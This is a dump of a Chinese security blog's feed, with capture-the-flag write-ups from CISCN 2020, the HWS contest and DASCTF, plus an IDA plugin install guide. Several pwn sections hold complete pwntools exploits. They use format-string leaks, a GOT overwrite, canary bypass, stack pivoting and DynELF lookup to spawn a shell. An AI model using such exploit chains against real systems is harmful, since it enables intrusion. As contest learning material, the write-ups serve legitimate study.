&#39;a&#39;add(0,0x70,payload)add(0,0x90,payload)payload = p64(0x0000000000602058) + p64(0x90)edit(0,payload)edit(1,p64(elf.plt[&#39;printf&#39;]))sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)payload = &#39;aaaa%7$s&#39; + p64(0x000000000602018)sa(&#39;idx&#39;,payload)r(4)r(4)libc_base = uu64(r(6)) - libc.sym[&#39;puts&#39;]info_addr(&#39;libc_base&#39;,libc_base)sys = libc_base + libc.sym[&#39;system&#39;]sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)payload = &#39;aaaa%82c&#39; + &#39;%8$hhn11&#39; + p64(0x000000000602058)sa(&#39;idx&#39;,payload)edit(1,p64(sys))s(&#39;sh&#39;)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ciscn-2020åˆèµ›éƒ¨åˆ†é¢˜ç›®&quot;&gt;&lt;a href=&quot;#ciscn-2020åˆèµ›éƒ¨åˆ†é¢˜ç›®&quot; class=&quot;headerlink&quot; title=&quot;ciscn  2020åˆèµ›éƒ¨åˆ†é¢˜ç›®&quot;&gt;&lt;/a&gt;ciscn  2020åˆèµ›éƒ¨åˆ†é¢˜ç›®&lt;/h1&gt;&lt;h2 id=&quot;re&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®</title>
    <link href="http://chumen77.xyz/2020/08/16/%E6%97%A0%E6%A0%87%E9%A2%98/"/>
    <id>http://chumen77.xyz/2020/08/16/æ— æ ‡é¢˜/</id>
    <published>2020-08-16T11:12:38.871Z</published>
    <updated>2020-08-17T13:55:03.167Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®"><a href="#å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®" class="headerlink" title="å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®"></a>å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="IOT1"><a href="#IOT1" class="headerlink" title="IOT1"></a>IOT1</h3><h4 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><p>å‚è€ƒï¼š<br><a href="https://www.cnblogs.com/csnd/p/11800622.html" target="_blank" rel="noopener">https://www.cnblogs.com/csnd/p/11800622.html</a></p><p>æ³¨æ„ç½‘å¡é‚£å—ï¼Œè¦å¯¹åº”è‡ªå·±è™šæ‹Ÿæœºç½‘å¡çš„æƒ…å†µã€‚</p><h5 id="å¯åŠ¨å‘½ä»¤ï¼š"><a href="#å¯åŠ¨å‘½ä»¤ï¼š" class="headerlink" title="å¯åŠ¨å‘½ä»¤ï¼š"></a>å¯åŠ¨å‘½ä»¤ï¼š</h5><pre><code class="python">qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append &quot;root=/dev/sda console=tty50&quot;  -net nic -net tap</code></pre><h4 id="æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥"><a href="#æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥" class="headerlink" title="æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥"></a>æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥</h4><pre><code class="bash">scp -r /path/maze username@servername:/path </code></pre><h4 id="ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ"><a href="#ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ" class="headerlink" title="ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ"></a>ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ</h4><pre><code class="bash">  fgets(buf,0x28,_stdin);  len = strlen(buf);  uStack68 = 0x20;  if (*(char *)((int)&amp;uStack68 + len + 3) == &#39;\n&#39;) {    *(undefined *)((int)&amp;uStack68 + len + 3) = 0;    len = len - 1;  }  if (len != 0x20) {    eorr();  }</code></pre><p>è¿™ä¸€æ®µå¯ä»¥ç¡®å®šè®©è¾“å…¥çš„æ˜¯32ä¸ªå­—ç¬¦ã€‚</p><pre><code class="c">void FUN_004006f0(void){  int i;  int j;  i = 0;  while (i &lt; DAT_16) {    j = 0;    while (j &lt; 8) {      maze[i * 8 + j] =           (char)(((int)s_AMz1nG~#--Ma7e~_00411034[i] &amp; *(uint *)(&amp;DAT_00411044 + j * 4)) &gt;&gt;                 (7U - j &amp; 0x1f));      j = j + 1;    }    i = i + 1;  }  return;}</code></pre><p>å¯ä»¥çœ‹åˆ°è¿·å®«æ˜¯åœ¨è¿è¡Œæ—¶æ ¹æ®éƒ¨åˆ†æ•°æ®ï¼Œæ¥ç”Ÿæˆçš„ã€‚å¹¶ä¸”å…¶ä¸­ä¸€è¡Œæ˜¯8ä¸ªæ•°æ®ï¼Œä¸€åˆ—æ˜¯16ä¸ªï¼Œä¸€å…±128ä¸ªæ•°æ®ã€‚</p><p>å¯ä»¥ä½¿ç”¨gdbï¼Œæ–­ç‚¹åœ¨è¿™ä¸ªå‡½æ•°ä¹‹åï¼ŒæŠŠè¿·å®«æå–å‡ºæ¥ã€‚æå–å‡ºæ¥çš„éƒ½æ˜¯0x1 å’Œ 0x0<br>ç»„æˆçš„è¿·å®«ã€‚</p><p>è¿›å…¥æ§åˆ¶èµ°ä½çš„å‡½æ•°ï¼š</p><pre><code class="c">  heng = 1;  shu = 0;  pcStackX0 = param_1</code></pre><p>è¿™ä¸ªåœ°æ–¹æ§åˆ¶è¯´ï¼Œèµ·å…ˆèµ·ç‚¹æ˜¯ç¬¬1è¡Œçš„ç¬¬2ä¸ªä½ç½®ã€‚</p><p>checkå‡½æ•°ï¼Œä¸»è¦æ˜¯çœ‹ä½ æ˜¯ä¸æ˜¯åœ¨ç§»åŠ¨åï¼Œèµ°åˆ°äº†0ä¸Šï¼Œèµ°åˆ°çš„è¯ï¼Œç¨‹åºå°±åˆ¤ä½ å¤±è´¥ã€‚</p><p>å¾€ä¸‹çœ‹ï¼Œå‘ç°ä¸»è¦åˆ¤æ–­ï¼š</p><pre><code class="c">          if (cVar1 != &#39;U&#39;) {LAB_00400ad4:            if ((heng == 1) &amp;&amp; (shu == 10)) {              uVar3 = 1;            }            else {              uVar3 = 0;            }</code></pre><p>åœ¨è¿™ä¸€æ®µï¼Œå¯ä»¥ç¡®å®šèµ°åˆ°ç¬¬11åˆ—çš„ç¬¬2ä¸ªæ•°å­—å³å¯ã€‚</p><h4 id="æå–è¿·å®«å›¾å¹¶å¤„ç†"><a href="#æå–è¿·å®«å›¾å¹¶å¤„ç†" class="headerlink" title="æå–è¿·å®«å›¾å¹¶å¤„ç†"></a>æå–è¿·å®«å›¾å¹¶å¤„ç†</h4><h5 id="è„šæœ¬æå–"><a href="#è„šæœ¬æå–" class="headerlink" title="è„šæœ¬æå–"></a>è„šæœ¬æå–</h5><pre><code class="c">data=&quot;AMz1nG~#--Ma7e~&quot;data2=[0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1]maze=[]lie=0while lie&lt;15:    hang=0    while hang&lt;8:        # print(hex(ord(data[lie])&amp;data2[hang]),(7-hang&amp;0x1f))        maze.append((ord(data[lie])&amp;data2[hang])&gt;&gt;(7-hang&amp;0x1f))        hang+=1    lie+=1print(maze)</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/lAdA8H.png" srcset="/img/loading.gif" alt></p><p>å°±è¿™è¿·å®«ï¼Œæˆ‘çœ‹äº†å¥½ä¸€ä¼šæ‰èƒ½èµ°å¥½ã€‚ğŸ¤£ğŸ¤£æœäº†è‡ªå·±ï¼Œè€ä»¥ä¸ºæ˜¯æ•°æ®æå–é”™äº†ã€‚</p><pre><code class="bash">flag = md5{DDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU}</code></pre><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary_"></a><code>baby_canary_</code></h3><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><h5 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h5><ul><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥ç”¨æ¥æ³„æ¼ã€‚</li><li>æ ˆæº¢å‡ºï¼Œåªèƒ½1ä¸ªgadgetã€‚</li></ul><h5 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h5><h6 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h6><p>åªèƒ½æº¢å‡ºä¸€ä¸ªgadgetï¼Œè‚¯å®šæ˜¯æ‰“æ ˆè¿ç§»ï¼Œä½†æ˜¯è·Ÿä»¥å¾€çš„æ ˆè¿ç§»ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸€ä¸ªgadgetåªèƒ½æº¢å‡ºåˆ°rbpï¼Œå¹¶ä¸èƒ½è¦†ç›–åˆ°ret addressï¼Œæ‰€ä»¥åªèƒ½è¦†ç›–å¥½rbpåï¼Œåˆ©ç”¨ç¨‹åºèµ°å‡ºè¿™ä¸ªå‡½æ•°åï¼Œå°†è¦ç»“æŸç¨‹åºæ—¶çš„<code>leave ret</code> ã€‚</p><p>ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯å› ä¸ºåœ¨èµ°è¿‡ä¸€æ¬¡ <code>leave ret</code>æ—¶ï¼Œæ­¤æ—¶çš„rbpå·²ç»è¢«æ”¹äº†ï¼Œå†è¿‡ç¨‹åºçš„ç¬¬äºŒä¸ªleave ret å‰ï¼Œéœ€è¦è¿‡ä¸€ä¸‹canaryçš„æ£€æµ‹:</p><pre><code class="bash">[----------------------------------registers-----------------------------------]RAX: 0x0RBX: 0x0RCX: 0x0RDX: 0x38 (&#39;8&#39;)RSI: 0x7ffefee5e310 --&gt; 0x26c46b053d3e2f00RDI: 0x0RBP: 0x601198 --&gt; 0x26c46b053d3e2f00RSP: 0x7ffefee5e350 --&gt; 0x7ffefee5e440 --&gt; 0x1RIP: 0x4008de (mov    rdx,QWORD PTR [rbp-0x8])R8 : 0x7f0bb0977700 (0x00007f0bb0977700)R9 : 0x12R10: 0x78 (&#39;x&#39;)R11: 0x246R12: 0x400680 (xor    ebp,ebp)R13: 0x7ffefee5e440 --&gt; 0x1R14: 0x0R15: 0x0EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]   0x4008cf:    mov    eax,0x0   0x4008d4:    call   0x4007de   0x4008d9:    mov    eax,0x0=&gt; 0x4008de:    mov    rdx,QWORD PTR [rbp-0x8]   0x4008e2:    xor    rdx,QWORD PTR fs:0x28   0x4008eb:    je     0x4008f2   0x4008ed:    call   0x400600 &lt;__stack_chk_fail@plt&gt;</code></pre><p>çœ‹è¿™é‡Œï¼Œåœ¨å–æ•°å€¼æ—¶ï¼Œå…¶åœ¨ä½ è¿ç§»çš„bssæ®µè¯»å–æ•°å€¼åˆ°rdxè¿›è¡Œåˆ¤æ–­çš„ï¼Œæ‰€ä»¥åœ¨ç¬¬ä¸€æ¬¡å¾€bssæ®µè¯»çš„æ—¶å€™ï¼Œå¡«å……å¥½canaryçš„å€¼ã€‚</p><p>å¹¶ä¸”è¿™ä¸ªé¢˜ï¼Œåœ¨çœ‹gotè¡¨åˆ°bssæ®µçš„è·ç¦»ä¹Ÿæ˜¯å¾ˆè¿‘çš„ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/zbOm9Q.png" srcset="/img/loading.gif" alt></p><p>æ‰€ä»¥åœ¨è¿ç§»çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œä»æœ‰å®é™…æ„ä¹‰çš„å‡½æ•°ï¼ˆæ¯”å¦‚putsï¼‰å¼€å§‹å‰å°±å¾—æŠŠæ ˆæŠ¬é«˜ã€‚å¦åˆ™åœ¨è¿›å…¥libcçš„å†…éƒ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œä¼šå› ä¸ºå„ç§push pop è€Œä¿®æ”¹åˆ°gotå¤„çš„ä¸œè¥¿ï¼Œå¯¼è‡´ä¸ä»…æ³„æ¼çš„æ•°å€¼æœ‰é—®é¢˜ï¼Œå¹¶ä¸”å®¹æ˜“è®©ç¨‹åºå´©æ‰ã€‚</p><pre><code class="bash">payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)s.sendafter(&quot;canary &#39; s 5 0 n g :&quot;,payload)payload = p64(canary)*6+p64(bss+0x100-8)s.sendafter(&quot;canary &#39; s h 0 m e :&quot;,payload)s.recvline()puts = u64(s.recv(6).ljust(8,&#39;\x00&#39;))success(hex(puts))s.recvline()</code></pre><p>æ­¤å¤„å°±å¯ä»¥æ³„æ¼å‡ºputså‡½æ•°çš„libcåœ°å€ï¼Œä½†æ˜¯ç”±äºå‡ºé¢˜äººæƒ³è€ƒå¯Ÿ<code>ret2dl_runtime_resolve</code>,æ‰€ä»¥åº”è¯¥æ˜¯é­”æ”¹äº†libcã€‚</p><p>ç„¶åå¯ä»¥ä½¿ç”¨DynELFæ¥æå®šï¼Œå‚è€ƒç¾¤é‡Œå¸ˆå‚…åˆ†äº«çš„expã€‚</p><h6 id="Dynelfå‡½æ•°æ€ä¹ˆå†™"><a href="#Dynelfå‡½æ•°æ€ä¹ˆå†™" class="headerlink" title="Dynelfå‡½æ•°æ€ä¹ˆå†™"></a>Dynelfå‡½æ•°æ€ä¹ˆå†™</h6><p>ç”±äºç¨‹åºåªæœ‰putså‡½æ•°æ¥è¾“å‡ºï¼Œå°±ç”¨putså‡½æ•°æ¥è¿›è¡Œæ³„æ¼ã€‚</p><pre><code class="python">payload = p64(0) * 57 +p64(canary) * 2  +p64(pop_rdi)+p64(address)+p64(puts_plt)+ p64(start_addr)</code></pre><p>æœ¬æ¥æˆ‘æ˜¯è¿™æ ·å†™çš„ï¼Œä½†æ˜¯å‘ç°ç¨‹åºè¿˜æ˜¯ä¼šå´©ï¼Œç”±äºç¨‹åºæƒ…å†µçš„é™åˆ¶ï¼Œæ ˆåªèƒ½æé«˜<code>0x1b0</code>è¿™æ ·ï¼Œè¿˜æ˜¯ä¸å¤Ÿç”¨ã€‚</p><p>è¿˜æ˜¯å°±æƒ³åŠæ³•æå‡æ ˆï¼Œå¾€é«˜ç‚¹çš„bssä¸Šå†™å…¥ropè¿›è¡Œæƒ³è¦çš„æ“ä½œã€‚</p><p>è¿™ä¸ªå°±åœ¨Dynelfå‰å†™å¥½,ç”¨ropæ§åˆ¶å‚æ•°ï¼Œè°ƒç”¨readå‡½æ•°æ¥å¾€é«˜ç‚¹çš„bssæ®µè¿›è¡Œå†™payloadï¼Œå¹¶ä¸”æœ€åç”¨pop rspçš„æ“ä½œï¼ŒæŠŠå†™å¥½rop chainçš„bssçš„åœ°å€pop åˆ°rspä¸Šï¼Œç„¶åå†retä¸Šå»ï¼š</p><pre><code class="python">payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+0x500-8*3)+&quot;/bin/sh\x00&quot;s.sendafter(&quot;canary &#39; s 5 0 n g :&quot;,payload)payload = p64(canary)*6+p64(bss+0x100-8)s.sendafter(&quot;canary &#39; s h 0 m e :&quot;,payload)s.recvline()</code></pre><p>æ¥ç€å°±æ˜¯ç”¨è¿™å†™å¥½å¥½çš„rop chainï¼Œè¿›è¡Œæ³„æ¼åœ°å€ï¼Œä¸ºäº†Dynelfå¤šæ¬¡è°ƒç”¨æ³„æ¼ï¼Œåœ¨æ³„æ¼åœ°å€åï¼Œè·Ÿä¸Šreadå‡½æ•°ç»§ç»­å¾€è¿™æ®µåœ°å€ä¸Šè¯»å–åŒæ ·çš„rop chainï¼Œç„¶åå†æ¬¡æ§åˆ¶rspï¼Œæ¥ç€retåˆ°å¯¹åº”çš„ä½ç½®ï¼š</p><pre><code class="python">def vuln(address):    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(0)    payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0) + \                   p64(read_plt)+p64(pop_rsp_3)+p64(0x6015a0-8*3)    s.recvline(timeout=0.07)    s.send(payload)    count = 0    up = &quot;&quot;    buf = &#39;&#39;    while True:        c = s.recv(numb=1, timeout=0.07)        count += 1        if up == &#39;\n&#39; and c == &quot;&quot;:              buf = buf[:-1]                        buf += &quot;\x00&quot;            break        else:            buf += c            up = c    data = buf[:8]    log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return data</code></pre><p>å¯ä»¥çœ‹åˆ°æ˜¯æé«˜äº†0x500ä¸ªå­—èŠ‚çš„åœ°æ–¹è¿›è¡Œropï¼Œåšå¥½ç”¨æ§åˆ¶rspï¼Œretåè¿›è¡Œåå¤æ¨ªè·³è·ƒï¼Œå®Œæˆå¯¹system çš„å¯»æ‰¾ã€‚æ„Ÿè§‰è¿™æ˜¯å¾ˆå¥½çš„åŠæ³•ï¼Œå› ä¸ºæ ˆè¿ç§»çš„æ ¸å¿ƒè¿˜æ˜¯æ§åˆ¶rspï¼Œæœ€åˆå­¦ä¹ æ˜¯è§è¿‡2æ¬¡æ ˆè¿ç§»çš„é¢˜ç›®ï¼Œå½“æ—¶ç”¨çš„è¿˜æ˜¯leave ret æ¥è¿›è¡Œçš„æ§åˆ¶ï¼Œç°åœ¨çœ‹åˆ°ç›´æ¥ä½¿ç”¨pop rsp æ¥æ§åˆ¶ï¼Œçš„ç¡®æ˜¯æ–¹ä¾¿åˆç®€å•çš„åŠæ³•ã€‚</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *# from LibcSearcher import *s = process(&quot;./pwn&quot;)# s = remote(&quot;183.129.189.61&quot;,54900)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)elf = ELF(&quot;./pwn&quot;)context.log_level=&#39;debug&#39;def debug():    # gdb.attach(proc.pidof(s)[0],gdbscript=&#39;b main&#39;)    gdb.attach(s)    pause()pop_rdi = 0x0000000000400963pop_rsi_r15 = 0x0000000000400961pop_rsp_3 = 0x000000000040095dleave_ret = 0x00000000004007dccontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]puts_plt = elf.plt[&#39;puts&#39;]puts_got = elf.got[&#39;puts&#39;]read_plt = elf.plt[&#39;read&#39;]bss = 0x6010a0s.sendafter(&quot;canary &#39; s @ # $ % ^ &amp; * :\n&quot;, &quot;%9$p&quot;)canary = int(s.recvline(keepends=False), 16)success(hex(canary))context.arch = &#39;amd64&#39;def vuln(address):    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(0)    payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0) + \                   p64(read_plt)+p64(pop_rsp_3)+p64(0x6015a0-8*3)    s.recvline(timeout=0.07)    s.send(payload)    count = 0    up = &quot;&quot;    buf = &#39;&#39;    while True:        c = s.recv(numb=1, timeout=0.07)        count += 1        if up == &#39;\n&#39; and c == &quot;&quot;:              buf = buf[:-1]                        buf += &quot;\x00&quot;            break        else:            buf += c            up = c    data = buf[:8]    log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return datadebug()payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+0x500-8*3)+&quot;/bin/sh\x00&quot;s.sendafter(&quot;canary &#39; s 5 0 n g :&quot;,payload)payload = p64(canary)*6+p64(bss+0x100-8)s.sendafter(&quot;canary &#39; s h 0 m e :&quot;,payload)s.recvline()puts = u64(s.recv(6).ljust(8,&#39;\x00&#39;))success(hex(puts))s.recvline()d = DynELF(vuln,elf=elf)system = d.lookup(&#39;system&#39;,&#39;libc&#39;)success(hex(system))payload = p64(pop_rdi)+p64(0x6010a0+0x100+8*11)+p64(system)s.send(payload)s.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®&quot;&gt;&lt;a href=&quot;#å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®&quot; class=&quot;headerlink&quot; title=&quot;å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®&quot;&gt;&lt;/a&gt;å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®&lt;/h1&gt;&lt;h2 id=&quot;RE&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="IOT" scheme="http://chumen77.xyz/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>MacOSå®‰è£…IDAæ’ä»¶keypatch</title>
    <link href="http://chumen77.xyz/2020/08/10/MacOS%E5%AE%89%E8%A3%85IDA%E6%8F%92%E4%BB%B6keypatch/"/>
    <id>http://chumen77.xyz/2020/08/10/MacOSå®‰è£…IDAæ’ä»¶keypatch/</id>
    <published>2020-08-10T09:23:15.104Z</published>
    <updated>2020-08-10T15:11:27.782Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MacOSå®‰è£…IDAæ’ä»¶keypatch"><a href="#MacOSå®‰è£…IDAæ’ä»¶keypatch" class="headerlink" title="MacOSå®‰è£…IDAæ’ä»¶keypatch"></a>MacOSå®‰è£…IDAæ’ä»¶keypatch</h1><p>macOS å®‰è£…å®˜æ–¹ä»‹ç»çš„å®‰è£…æ–¹å¼ä¸å¤ªè¡Œã€‚ç½‘ä¸Šå‚è€ƒåè®°å½•ä¸€ä¸‹ã€‚</p><h2 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h2><pre><code class="bash">brew install cmake</code></pre><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><pre><code class="bash">git clone https://github.com/fjh658/keystone-engine.gitcd keystone-enginegit submodule update --init --recursivesudo python2 setup.py install --verbose</code></pre><p>æ­¤æ—¶åœ¨å®‰è£…åçš„æœ€åå‡ æ®µä»£ç ä¸­ï¼Œæ‰¾åˆ°ç±»ä¼¼ï¼š</p><pre><code class="bash">/Library/Python/2.7/site-packages/keystone</code></pre><p>è¿™æ˜¯æœ¬åœ°python2.7çš„è·¯å¾„ã€‚</p><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><pre><code class="bash">cp -r /Library/Python/2.7/site-packages/keystone /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/python/lib/python2.7/lib-dynload/</code></pre><pre><code class="bash">sudo  curl -L https://raw.githubusercontent.com/keystone-engine/keypatch/master/keypatch.py &gt; keypatch.py</code></pre><p>ç°å®æ‹’ç»çš„è¯ï¼Œå¯ä»¥</p><pre><code class="bash">vim /etc/hosts199.232.68.133 raw.githubusercontent.com</code></pre><pre><code class="bash">cp -r ./keypatch.py /Applications/IDA\ Pro\ 7.0/ida64.app/Contents/MacOS/plugins/cp -r ./keypatch.py /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/plugins/</code></pre><p>ç„¶åè¿›å…¥idaä½¿ç”¨å³å¯ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MacOSå®‰è£…IDAæ’ä»¶keypatch&quot;&gt;&lt;a href=&quot;#MacOSå®‰è£…IDAæ’ä»¶keypatch&quot; class=&quot;headerlink&quot; title=&quot;MacOSå®‰è£…IDAæ’ä»¶keypatch&quot;&gt;&lt;/a&gt;MacOSå®‰è£…IDAæ’ä»¶keypatch&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="æ‚é¡¹" scheme="http://chumen77.xyz/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>DASCTFå®‰æ’æœˆèµ›(7th)</title>
    <link href="http://chumen77.xyz/2020/07/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(7th)/"/>
    <id>http://chumen77.xyz/2020/07/25/DASCTFå®‰æ’æœˆèµ›(7th)/</id>
    <published>2020-07-25T13:50:36.163Z</published>
    <updated>2020-08-10T03:50:16.610Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTFå®‰æ’æœˆèµ›-7th"><a href="#DASCTFå®‰æ’æœˆèµ›-7th" class="headerlink" title="DASCTFå®‰æ’æœˆèµ›(7th)"></a>DASCTFå®‰æ’æœˆèµ›(7th)</h1><p>åªåšå‡ºä¸ªç­¾åˆ°é¢˜ï¼Œtclã€‚ã€‚ã€‚</p><h2 id="è™šå‡çš„ç­¾åˆ°é¢˜"><a href="#è™šå‡çš„ç­¾åˆ°é¢˜" class="headerlink" title="è™šå‡çš„ç­¾åˆ°é¢˜"></a>è™šå‡çš„ç­¾åˆ°é¢˜</h2><p>ç®€å•çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯å‡ºé¢˜äººä¼°è®¡æ˜¯ç”¨äº†GCC&gt;=4.9ç‰ˆæœ¬ï¼Œæ•…æ„ç»™è¿™ä¸ªStack Buffer Overflow è®¾ç½®éš¾åº¦ã€‚</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code> 0x80485fd &lt;main+104&gt;:        mov    ecx,DWORD PTR [ebp-0x4] 0x8048600 &lt;main+107&gt;:        leave 0x8048601 &lt;main+108&gt;:        lea    esp,[ecx-0x4] 0x8048604 &lt;main+111&gt;:        ret</code></pre><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºåœ¨å¯¹æ ˆçš„ä¿å­˜ä¸Šï¼Œé¢å¤–ä½¿ç”¨äº† ecx æ¥ä¿å­˜æ ˆä¸Šçš„æŸä¸ªå€¼ã€‚å¹¶ä¸”è°ƒè¯•å¯ä»¥å‘ç°ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥overflowäº† espï¼Œé‚£ä¹ˆä¼šé€ æˆå¥‡æ€ªçš„å½±å“ã€‚</p><p>è¯•ç€åˆ†æä¸€ä¸‹ï¼š</p><ul><li>æƒ³è¦æ§åˆ¶espï¼Œå°±å¾—æ§åˆ¶ecx</li><li>æƒ³è¦æ§åˆ¶ecxï¼Œå°±å¾—è‡³å°‘æ§åˆ¶åˆ°ebp-0x4çš„ä½ç½®</li></ul><p>ç”±äºæ˜¯getsçš„è·å–è¾“å…¥ï¼Œè¿™ä¸ªæ˜æ˜¾å¾ˆå®¹æ˜“å®ç°ã€‚</p><p>æ ¸å¿ƒå°±æ˜¯è®©ï¼š</p><pre><code>[ [ebp-0x4] - 0x4] = address(backdoor)</code></pre><p>é™„ä¸ŠæˆåŠŸæ—¶æ ˆæƒ…å†µ,æ–­ç‚¹åœ¨0x80485fd ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/cIBzn5.png" srcset="/img/loading.gif" alt></p><p>ç”±äºæ ˆéšæœºåŒ–ï¼Œå…¶ä¸­éœ€è¦ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„æ¼<code>[ebp-0x4]</code>ï¼Œæ¥è·å–åœ¨<br>ebp-0x4çš„ä½ç½®å¡«å…¥ä»€ä¹ˆå€¼åˆé€‚ï¼Œä»è€Œå®Œæˆæ”»å‡»ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./qiandao&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10013)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  